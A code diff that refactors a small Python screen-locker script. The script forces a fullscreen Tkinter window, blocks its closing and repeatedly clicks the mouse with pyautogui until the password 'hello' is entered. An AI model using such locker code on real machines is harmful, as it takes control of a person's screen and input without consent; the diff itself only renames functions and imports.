@@ -1,17 +1,17 @@
 from tkinter import Tk, Entry, Label
-from pyautogui import  click, moveTo
-from time import sleep
+import pyautogui
+import time
 
 
-def callback(event):
+def on_key_press(event):
     global k, entry
     if entry.get() == "hello":
         k = True
 
 
 def on_closing():
-    click(675, 420)
-    moveTo(675, 420)
+    pyautogui.click(675, 420)
+    pyautogui.moveTo(675, 420)
     root.attributes("-fullscreen", True)
     root.protocol("WM_DELETE_WINDOW", on_closing)
     root.update()
@@ -26,8 +26,8 @@ label0.grid(row = 0, column = 0)
 label1 = Label(root, text = "Write the password and press Ctrl+C", font = 'Arial 20')
 label1.place(x = 470, y = 300)
 root.update()
-sleep(0.2)
-click(675, 420)
+time.sleep(0.2)
+pyautogui.click(675, 420)
 k = False
 while k != True:
     on_closing()
